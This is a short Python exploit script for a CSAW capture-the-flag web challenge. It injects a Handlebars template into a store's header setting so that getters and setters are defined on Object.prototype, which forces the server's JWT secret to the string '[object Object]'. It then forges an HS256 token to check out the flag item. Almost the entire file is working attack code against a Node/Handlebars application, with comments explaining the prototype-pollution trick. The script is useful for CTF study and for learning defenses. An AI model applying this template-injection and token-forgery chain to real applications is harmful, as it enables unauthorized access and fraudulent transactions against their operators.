#!/usr/bin/python3
import requests
import jwt 

base = 'http://web.chal.csaw.io:1002'
s = requests.Session()

# create new session
s.get(base)

# create new store and get the id
r = s.post('%s/store' % base, data={'name':'terjanq'}, allow_redirects=False)
store_id = r.headers['location'][7:-1]
print('store_id:', store_id)
print('connect.sid:', s.cookies['connect.sid'])

# create 'key' setter and getter on Object prototype so we controll `secret key`

s.post('%s/store/%s/manage/settings' %(base, store_id), data={
    'header':'''
    {{#with this.__proto__ as |o|}}
      {{o.__defineGetter__ "key" toString}}
      {{o.__defineSetter__ "key" toString}}
    {{/with}}
'''}, allow_redirects=False)

# The above template is equivalent to:
#   Object.defineProperty(
#     Object.prototype, 'key', {
#      get: function(){
#        return this.toString()
#      }
#      set: function(){
#        return this.toString()
#      }
#    }
#   )
# [Object].key will now return `[object Object]` as string on newly created objects


# Execute our loaded template
s.get('%s/store/%s' % (base, store_id))


# Forge flag token
flag_token = jwt.encode({
    "id": "flag.flag",
    "price": 1,
    "iat": 1568568228
  }, '[object Object]', algorithm='HS256')


# checkout the forged token and display the flag
r = s.post( '%s/store/%s/checkout' % (base,store_id), data={'token': flag_token })

print(r.text)
